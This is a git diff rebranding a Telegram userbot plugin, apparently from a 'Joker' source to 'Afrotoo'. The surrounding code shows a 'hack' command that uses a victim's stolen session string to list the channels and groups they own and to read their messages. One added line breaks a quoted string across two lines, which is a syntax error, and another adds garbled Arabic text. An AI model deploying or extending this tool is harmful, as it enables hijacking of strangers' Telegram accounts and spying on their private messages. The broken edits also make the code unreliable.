@@ -1,9 +1,9 @@
 
-from AfrotooUB import bot, l313l
+from AfrotooRUB import bot, l313l
 #By Source joker @jepthon
 from telethon import events, functions, types, Button
 from datetime import timedelta
-from AfrotooUB.utils import admin_cmd
+from AfrotooRUB.utils import admin_cmd
 import asyncio
 from ..Config import Config
 import os, asyncio, re
@@ -160,7 +160,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "jepthon"
+channel = "Afrotoo3"
 menu = '''
 
 "A" :~ [معرفه قنوات/كروبات التي يملكها]
@@ -230,7 +230,7 @@ if Config.TG_BOT_USERNAME is not None and tgbot is not None:
         if query.startswith("هاك") and event.query.user_id == bot.uid:
             buttons = Button.url(" اضغط هنا عزيزي ", f"https://t.me/{joker}?start=hack")
             result = builder.article(
-                title="Aljoker 🤡",
+                title="Afrotoo 🤡",
                 description="اضغط على الزر لعرض الأوامر.",
                 text="**᯽︙ قم بالضغط على زر ادناه لأستخدام امر اختراق عبر كود التيرمكس",
                 buttons=buttons
@@ -312,7 +312,8 @@ async def users(event):
     else:
       return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس عفرتو ا
+           ❤️.\n/hack", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -340,7 +341,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لأستخدامك سورس الجوكر", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس تليثون لا لا ر", buttons=keyboard)
     
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
